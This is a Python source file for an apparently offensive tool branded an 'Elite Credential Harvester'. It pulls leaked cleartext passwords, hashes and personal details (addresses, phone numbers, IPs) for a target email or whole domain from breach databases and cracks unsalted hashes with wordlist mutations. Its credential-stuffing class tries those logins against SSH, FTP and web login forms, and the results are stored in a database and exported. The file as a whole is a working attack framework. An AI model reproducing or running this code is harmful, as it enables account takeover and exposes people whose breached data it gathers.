#!/usr/bin/env python3
"""
╦ ╦╦ ╦╔═╗╦ ╦╔═╗╔═╗  ╔═╗╦  ╦ ╦╔═╗╔═╗ - ELITE EDITION
╠═╣║ ║║ ╦╠═╣║╣ ╚═╗  ║  ║  ║ ║║╣ ╚═╝
╩ ╩╚═╝╚═╝╩ ╩╚═╝╚═╝  ╚═╝╩═╝╚═╝╚═╝╚═╝

Elite Credential Harvester
Breach Database Integration | Password Analysis | Credential Stuffing | Hash Cracking
"""

import asyncio
import aiohttp
import requests
from typing import Dict, List, Optional, Set, Tuple
from dataclasses import dataclass, field
import json
import hashlib
import hmac
import base64
from datetime import datetime
import re
from collections import Counter, defaultdict
import itertools
import string
import bcrypt
from passlib.hash import md5_crypt, sha512_crypt, bcrypt as passlib_bcrypt
from pymongo import MongoClient
import sqlite3
import pickle
import logging
from concurrent.futures import ThreadPoolExecutor, ProcessPoolExecutor
import numpy as np
from urllib.parse import urljoin, urlparse
import socket
import telnetlib
from ftplib import FTP
import paramiko
from smb.SMBConnection import SMBConnection
import redis

try:
    import asyncssh
except ImportError:
    asyncssh = None

logging.basicConfig(level=logging.INFO)
logger = logging.getLogger(__name__)


@dataclass
class Credential:
    """Credential data structure"""
    username: str
    password: str = None
    password_hash: str = None
    hash_type: str = None
    email: str = None
    domain: str = None
    source: str = None
    breach_date: str = None
    additional_data: Dict = field(default_factory=dict)
    verified: bool = False
    verified_on: List[str] = field(default_factory=list)
    

@dataclass
class BreachData:
    """Breach information"""
    breach_name: str
    breach_date: str
    description: str
    compromised_accounts: int
    compromised_data: List[str]
    verified: bool
    source: str


class BreachDatabaseInterface:
    """Interface to multiple breach databases"""
    
    def __init__(self, api_keys: Dict[str, str] = None):
        self.api_keys = api_keys or {}
        self.session = None
        self.cache = {}
        
    async def create_session(self):
        """Create aiohttp session"""
        if not self.session:
            self.session = aiohttp.ClientSession()
    
    async def close_session(self):
        """Close session"""
        if self.session:
            await self.session.close()
    
    async def query_hibp(self, email: str) -> List[BreachData]:
        """Query HaveIBeenPwned API"""
        logger.info(f"[*] Querying HIBP for {email}")
        
        url = f"https://haveibeenpwned.com/api/v3/breachedaccount/{email}"
        headers = {
            'hibp-api-key': self.api_keys.get('hibp', ''),
            'User-Agent': 'Hughes-Clues-OSINT'
        }
        
        try:
            await self.create_session()
            async with self.session.get(url, headers=headers, timeout=15) as response:
                if response.status == 200:
                    breaches_raw = await response.json()
                    breaches = []
                    
                    for b in breaches_raw:
                        breaches.append(BreachData(
                            breach_name=b.get('Name'),
                            breach_date=b.get('BreachDate'),
                            description=b.get('Description'),
                            compromised_accounts=b.get('PwnCount', 0),
                            compromised_data=b.get('DataClasses', []),
                            verified=b.get('IsVerified', False),
                            source='haveibeenpwned'
                        ))
                    
                    logger.info(f"[+] Found {len(breaches)} breaches for {email}")
                    return breaches
                
                elif response.status == 404:
                    logger.info(f"[+] No breaches found for {email}")
                    return []
                    
        except Exception as e:
            logger.error(f"[!] HIBP query error: {str(e)}")
            return []
    
    async def query_dehashed(self, query: str, query_type: str = "email") -> List[Credential]:
        """Query DeHashed API for credentials"""
        logger.info(f"[*] Querying DeHashed for {query}")
        
        api_key = self.api_keys.get('dehashed')
        if not api_key:
            logger.warning("[!] DeHashed API key not configured")
            return []
        
        url = "https://api.dehashed.com/search"
        params = {query_type: query, 'size': 10000}
        headers = {
            'Accept': 'application/json',
            'Authorization': f'Bearer {api_key}'
        }
        
        try:
            await self.create_session()
            async with self.session.get(url, params=params, headers=headers, timeout=30) as response:
                if response.status == 200:
                    data = await response.json()
                    entries = data.get('entries', [])
                    
                    credentials = []
                    for entry in entries:
                        cred = Credential(
                            username=entry.get('username', entry.get('email', '')),
                            password=entry.get('password'),
                            password_hash=entry.get('hashed_password'),
                            email=entry.get('email'),
                            domain=entry.get('database_name'),
                            source='dehashed',
                            additional_data={
                                'name': entry.get('name'),
                                'address': entry.get('address'),
                                'phone': entry.get('phone'),
                                'ip_address': entry.get('ip_address')
                            }
                        )
                        credentials.append(cred)
                    
                    logger.info(f"[+] Found {len(credentials)} credentials")
                    return credentials
                    
        except Exception as e:
            logger.error(f"[!] DeHashed query error: {str(e)}")
            return []
    
    async def query_snusbase(self, query: str) -> List[Credential]:
        """Query Snusbase API"""
        logger.info(f"[*] Querying Snusbase for {query}")
        
        api_key = self.api_keys.get('snusbase')
        if not api_key:
            return []
        
        url = "https://api.snusbase.com/data/search"
        headers = {
            'Auth': api_key,
            'Content-Type': 'application/json'
        }
        payload = {'terms': [query], 'types': ['email', 'username', 'password'], 'wildcard': False}
        
        try:
            await self.create_session()
            async with self.session.post(url, json=payload, headers=headers, timeout=30) as response:
                if response.status == 200:
                    data = await response.json()
                    results = data.get('results', {})
                    
                    credentials = []
                    for db_name, entries in results.items():
                        for entry in entries:
                            cred = Credential(
                                username=entry.get('username'),
                                password=entry.get('password'),
                                password_hash=entry.get('hash'),
                                email=entry.get('email'),
                                domain=db_name,
                                source='snusbase'
                            )
                            credentials.append(cred)
                    
                    logger.info(f"[+] Found {len(credentials)} credentials from Snusbase")
                    return credentials
                    
        except Exception as e:
            logger.error(f"[!] Snusbase query error: {str(e)}")
            return []


class PasswordAnalyzer:
    """Advanced password analysis and cracking"""
    
    def __init__(self):
        self.common_passwords = self.load_common_passwords()
        self.password_patterns = self.compile_patterns()
        
    def load_common_passwords(self) -> Set[str]:
        """Load common passwords from rockyou, etc."""
        common = {
            'password', '123456', '12345678', 'qwerty', 'abc123', 'monkey',
            'letmein', 'trustno1', 'dragon', 'baseball', 'iloveyou', 'master',
            'sunshine', 'ashley', 'bailey', 'shadow', 'superman', 'qazwsx',
            'michael', 'football', 'password1', 'welcome', 'admin', 'root'
        }
        return common
    
    def compile_patterns(self) -> List[re.Pattern]:
        """Compile common password patterns"""
        return [
            re.compile(r'^[A-Z][a-z]+\d+$'),  # Capital + word + number
            re.compile(r'^[A-Z][a-z]+\d+!$'), # Capital + word + number + !
            re.compile(r'^\d{4,8}$'),          # All numbers
            re.compile(r'^[a-z]+\d{2,4}$'),   # Word + numbers
            re.compile(r'^.+\d{4}$'),         # Anything + 4 digits (likely year)
        ]
    
    def analyze_password_strength(self, password: str) -> Dict:
        """Comprehensive password strength analysis"""
        if not password:
            return {'strength': 'unknown', 'score': 0}
        
        score = 0
        length = len(password)
        
        # Length scoring
        if length >= 12:
            score += 20
        elif length >= 8:
            score += 10
        elif length >= 6:
            score += 5
        
        # Character diversity
        has_upper = bool(re.search(r'[A-Z]', password))
        has_lower = bool(re.search(r'[a-z]', password))
        has_digit = bool(re.search(r'\d', password))
        has_special = bool(re.search(r'[^A-Za-z0-9]', password))
        
        char_types = sum([has_upper, has_lower, has_digit, has_special])
        score += char_types * 15
        
        # Check against common passwords
        if password.lower() in self.common_passwords:
            score = max(0, score - 40)
        
        # Pattern detection (reduces score)
        for pattern in self.password_patterns:
            if pattern.match(password):
                score -= 10
                break
        
        # Entropy calculation
        entropy = len(set(password)) / length if length > 0 else 0
        score += int(entropy * 10)
        
        # Determine strength level
        if score >= 80:
            strength = 'very_strong'
        elif score >= 60:
            strength = 'strong'
        elif score >= 40:
            strength = 'medium'
        elif score >= 20:
            strength = 'weak'
        else:
            strength = 'very_weak'
        
        return {
            'strength': strength,
            'score': min(score, 100),
            'length': length,
            'has_uppercase': has_upper,
            'has_lowercase': has_lower,
            'has_digits': has_digit,
            'has_special': has_special,
            'entropy': entropy,
            'is_common': password.lower() in self.common_passwords
        }
    
    def generate_mutations(self, base_word: str, max_mutations: int = 100) -> List[str]:
        """Generate common password mutations"""
        mutations = []

        # Capitalization variants
        mutations.append(base_word)
        mutations.append(base_word.lower())
        mutations.append(base_word.upper())
        mutations.append(base_word.capitalize())

        # Leet speak
        leet_map = {'a': '4', 'e': '3', 'i': '1', 'o': '0', 's': '5', 't': '7'}
        leet_word = base_word.lower()
        for char, replacement in leet_map.items():
            leet_word = leet_word.replace(char, replacement)
        if leet_word != base_word.lower():
            mutations.append(leet_word)

        # Append numbers
        for num in ['1', '12', '123', '2024', '2025', '!', '!!', '123!']:
            mutations.append(base_word + num)
            mutations.append(base_word.capitalize() + num)

        # Prepend
        for prefix in ['i', 'my']:
            mutations.append(prefix + base_word)

        # Remove duplicates while preserving order
        seen = set()
        unique_mutations = []
        for mutation in mutations:
            if mutation not in seen:
                seen.add(mutation)
                unique_mutations.append(mutation)

        return unique_mutations[:max_mutations]
    
    def crack_hash(self, password_hash: str, hash_type: str = 'md5', 
                   wordlist: List[str] = None) -> Optional[str]:
        """Attempt to crack password hash"""
        if not wordlist:
            wordlist = list(self.common_passwords)
        
        hash_type = hash_type.lower()
        
        for word in wordlist:
            # Try the word and common mutations
            candidates = self.generate_mutations(word, max_mutations=50)
            
            for candidate in candidates:
                computed_hash = None
                
                if hash_type == 'md5':
                    computed_hash = hashlib.md5(candidate.encode()).hexdigest()
                elif hash_type == 'sha1':
                    computed_hash = hashlib.sha1(candidate.encode()).hexdigest()
                elif hash_type == 'sha256':
                    computed_hash = hashlib.sha256(candidate.encode()).hexdigest()
                elif hash_type == 'sha512':
                    computed_hash = hashlib.sha512(candidate.encode()).hexdigest()
                
                if computed_hash and computed_hash == password_hash.lower():
                    logger.info(f"[+] Cracked! Hash: {password_hash[:20]}... = {candidate}")
                    return candidate
        
        return None


class CredentialStuffer:
    """Credential stuffing attack framework"""
    
    def __init__(self, credentials: List[Credential], rate_limit: float = 1.0):
        self.credentials = credentials
        self.rate_limit = rate_limit
        self.successful_logins = []
        self.failed_attempts = []
        
    async def test_ssh(self, host: str, port: int = 22, timeout: int = 10) -> List[Credential]:
        """Test credentials against SSH asynchronously"""
        logger.info(f"[*] Testing {len(self.credentials)} credentials on SSH {host}:{port}")

        successful = []

        for cred in self.credentials[:50]:  # Limit to prevent lockouts
            if not cred.password:
                await asyncio.sleep(self.rate_limit)
                continue

            try:
                if asyncssh:
                    # Use asyncssh if available for true async operation
                    try:
                        async with asyncssh.connect(
                            host,
                            port=port,
                            username=cred.username,
                            password=cred.password,
                            known_hosts=None,
                            connect_timeout=timeout
                        ) as conn:
                            logger.info(f"[+] SUCCESS! SSH login: {cred.username}:{cred.password}")
                            cred.verified = True
                            cred.verified_on.append(f'ssh://{host}:{port}')
                            successful.append(cred)
                    except asyncssh.PermissionDenied:
                        pass
                    except asyncssh.HostKeyNotVerifiable:
                        # Host key verification failed, but auth might have succeeded
                        logger.debug(f"[!] Host key verification failed for {host}")
                else:
                    # Fallback to synchronous SSH in thread pool if asyncssh not available
                    loop = asyncio.get_event_loop()
                    result = await loop.run_in_executor(
                        None,
                        self._test_ssh_sync,
                        host,
                        port,
                        cred.username,
                        cred.password,
                        timeout
                    )
                    if result:
                        logger.info(f"[+] SUCCESS! SSH login: {cred.username}:{cred.password}")
                        cred.verified = True
                        cred.verified_on.append(f'ssh://{host}:{port}')
                        successful.append(cred)

            except Exception as e:
                logger.debug(f"[!] SSH test error: {str(e)}")

            await asyncio.sleep(self.rate_limit)

        return successful

    @staticmethod
    def _test_ssh_sync(host: str, port: int, username: str, password: str, timeout: int) -> bool:
        """Synchronous SSH test (runs in thread pool)"""
        try:
            ssh = paramiko.SSHClient()
            ssh.set_missing_host_key_policy(paramiko.AutoAddPolicy())

            ssh.connect(
                host,
                port=port,
                username=username,
                password=password,
                timeout=timeout,
                allow_agent=False,
                look_for_keys=False
            )
            ssh.close()
            return True
        except paramiko.AuthenticationException:
            return False
        except Exception:
            return False
    
    async def test_ftp(self, host: str, port: int = 21, timeout: int = 10) -> List[Credential]:
        """Test credentials against FTP asynchronously"""
        logger.info(f"[*] Testing credentials on FTP {host}:{port}")

        successful = []

        for cred in self.credentials[:50]:
            if not cred.password:
                await asyncio.sleep(self.rate_limit)
                continue

            try:
                # Run FTP test in thread pool to avoid blocking
                loop = asyncio.get_event_loop()
                result = await loop.run_in_executor(
                    None,
                    self._test_ftp_sync,
                    host,
                    port,
                    cred.username,
                    cred.password,
                    timeout
                )

                if result:
                    logger.info(f"[+] SUCCESS! FTP login: {cred.username}:{cred.password}")
                    cred.verified = True
                    cred.verified_on.append(f'ftp://{host}:{port}')
                    successful.append(cred)

            except Exception as e:
                logger.debug(f"[!] FTP test error: {str(e)}")

            await asyncio.sleep(self.rate_limit)

        return successful

    @staticmethod
    def _test_ftp_sync(host: str, port: int, username: str, password: str, timeout: int) -> bool:
        """Synchronous FTP test (runs in thread pool)"""
        try:
            ftp = FTP(timeout=timeout)
            ftp.connect(host, port)
            ftp.login(username, password)
            ftp.quit()
            return True
        except Exception:
            return False
    
    async def test_http_form(self, url: str, username_field: str = 'username', 
                            password_field: str = 'password', 
                            success_indicator: str = None) -> List[Credential]:
        """Test credentials against HTTP form"""
        logger.info(f"[*] Testing credentials on {url}")
        
        successful = []
        
        async with aiohttp.ClientSession() as session:
            for cred in self.credentials[:100]:
                if not cred.password:
                    continue
                
                data = {
                    username_field: cred.username,
                    password_field: cred.password
                }
                
                try:
                    async with session.post(url, data=data, timeout=10) as response:
                        content = await response.text()
                        
                        # Check for success indicators
                        is_success = False
                        if success_indicator:
                            is_success = success_indicator in content
                        else:
                            # Common success indicators
                            is_success = (
                                'dashboard' in content.lower() or
                                'welcome' in content.lower() or
                                'logout' in content.lower() or
                                response.status == 302  # Redirect
                            )
                        
                        if is_success:
                            logger.info(f"[+] SUCCESS! HTTP login: {cred.username}:{cred.password}")
                            cred.verified = True
                            cred.verified_on.append(url)
                            successful.append(cred)
                
                except Exception as e:
                    logger.debug(f"[!] HTTP test error: {str(e)}")
                
                await asyncio.sleep(self.rate_limit)
        
        return successful


class EliteCredentialHarvester:
    """Master credential harvesting orchestrator"""
    
    def __init__(self, api_keys: Dict[str, str] = None):
        self.breach_db = BreachDatabaseInterface(api_keys)
        self.password_analyzer = PasswordAnalyzer()
        self.credentials: List[Credential] = []
        self.breaches: List[BreachData] = []
        
        # Storage
        self.mongo_client = MongoClient('mongodb://localhost:27017')
        self.db = self.mongo_client['hughes_clues']
        self.creds_collection = self.db['credentials']
        self.breaches_collection = self.db['breaches']
        
    async def harvest_email(self, email: str) -> Dict:
        """Complete credential harvest for email"""
        logger.info(f"[*] Starting comprehensive harvest for {email}")
        
        results = {
            'email': email,
            'breaches': [],
            'credentials': [],
            'statistics': {}
        }
        
        # Query breach databases
        hibp_breaches = await self.breach_db.query_hibp(email)
        results['breaches'].extend(hibp_breaches)
        
        # Query credential databases
        dehashed_creds = await self.breach_db.query_dehashed(email, 'email')
        results['credentials'].extend(dehashed_creds)
        
        snusbase_creds = await self.breach_db.query_snusbase(email)
        results['credentials'].extend(snusbase_creds)
        
        # Analyze passwords
        password_analysis = []
        for cred in results['credentials']:
            if cred.password:
                analysis = self.password_analyzer.analyze_password_strength(cred.password)
                password_analysis.append(analysis)
        
        # Statistics
        results['statistics'] = {
            'total_breaches': len(results['breaches']),
            'total_credentials': len(results['credentials']),
            'cleartext_passwords': sum(1 for c in results['credentials'] if c.password),
            'hashed_passwords': sum(1 for c in results['credentials'] if c.password_hash),
            'password_strengths': Counter([a['strength'] for a in password_analysis]),
            'unique_passwords': len(set(c.password for c in results['credentials'] if c.password))
        }
        
        # Store in database
        self.store_results(results)
        
        logger.info(f"[+] Harvest complete! Found {results['statistics']['total_credentials']} credentials")
        
        return results
    
    async def harvest_domain(self, domain: str) -> Dict:
        """Harvest all credentials for a domain"""
        logger.info(f"[*] Starting domain-wide harvest for {domain}")
        
        # Query by domain
        dehashed_creds = await self.breach_db.query_dehashed(domain, 'domain')
        snusbase_creds = await self.breach_db.query_snusbase(domain)
        
        all_creds = dehashed_creds + snusbase_creds
        
        # Extract unique emails
        emails = set(c.email for c in all_creds if c.email)
        
        results = {
            'domain': domain,
            'emails_found': list(emails),
            'total_emails': len(emails),
            'credentials': all_creds,
            'total_credentials': len(all_creds)
        }
        
        self.store_results(results)
        
        return results
    
    def store_results(self, results: Dict):
        """Store results in MongoDB with proper serialization"""
        try:
            if 'breaches' in results:
                for breach in results['breaches']:
                    breach_doc = self._serialize_dataclass(breach)
                    self.breaches_collection.update_one(
                        {'breach_name': breach_doc['breach_name']},
                        {'$set': breach_doc},
                        upsert=True
                    )

            if 'credentials' in results:
                for cred in results['credentials']:
                    cred_doc = self._serialize_dataclass(cred)
                    self.creds_collection.update_one(
                        {'username': cred_doc['username'], 'source': cred_doc['source']},
                        {'$set': cred_doc},
                        upsert=True
                    )

            logger.info("[+] Results stored in database")

        except Exception as e:
            logger.error(f"[!] Storage error: {str(e)}")

    @staticmethod
    def _serialize_dataclass(obj) -> Dict:
        """Convert dataclass to MongoDB-compatible dict"""
        if hasattr(obj, '__dataclass_fields__'):
            result = {}
            for field_name, field in obj.__dataclass_fields__.items():
                value = getattr(obj, field_name)

                # Handle datetime objects
                if isinstance(value, datetime):
                    result[field_name] = value.isoformat()
                # Handle dataclass objects recursively
                elif hasattr(value, '__dataclass_fields__'):
                    result[field_name] = CredentialStuffer._serialize_dataclass(value)
                # Handle lists of dataclasses
                elif isinstance(value, list):
                    result[field_name] = [
                        CredentialStuffer._serialize_dataclass(item) if hasattr(item, '__dataclass_fields__') else item
                        for item in value
                    ]
                else:
                    result[field_name] = value
            return result
        return obj
    
    def export_results(self, filename: str = None) -> str:
        """Export all credentials to file"""
        if filename is None:
            filename = f"credentials_{datetime.now().strftime('%Y%m%d_%H%M%S')}.json"
        
        export_data = {
            'timestamp': datetime.now().isoformat(),
            'total_credentials': len(self.credentials),
            'credentials': [c.__dict__ for c in self.credentials]
        }
        
        with open(filename, 'w') as f:
            json.dump(export_data, f, indent=2, default=str)
        
        logger.info(f"[+] Credentials exported to {filename}")
        return filename
    
    async def cleanup(self):
        """Cleanup resources"""
        await self.breach_db.close_session()
        self.mongo_client.close()


async def main():
    """Demo execution"""
    import argparse
    
    parser = argparse.ArgumentParser(description='Hughes Clues Elite Credential Harvester')
    parser.add_argument('target', help='Email or domain to target')
    parser.add_argument('--type', choices=['email', 'domain'], default='email')
    parser.add_argument('--config', help='Config file with API keys')
    parser.add_argument('--output', help='Output filename')
    
    args = parser.parse_args()
    
    # Load API keys from config
    api_keys = {}
    if args.config:
        with open(args.config, 'r') as f:
            import yaml
            config = yaml.safe_load(f)
            api_keys = config.get('api_keys', {})
    
    harvester = EliteCredentialHarvester(api_keys)
    
    try:
        if args.type == 'email':
            results = await harvester.harvest_email(args.target)
        else:
            results = await harvester.harvest_domain(args.target)
        
        # Export results
        harvester.export_results(args.output)
        
        # Print summary
        print(f"\n{'='*60}")
        print("CREDENTIAL HARVEST SUMMARY")
        print(f"{'='*60}")
        if 'statistics' in results:
            for key, value in results['statistics'].items():
                print(f"{key}: {value}")
        
    finally:
        await harvester.cleanup()


if __name__ == '__main__':
    asyncio.run(main())
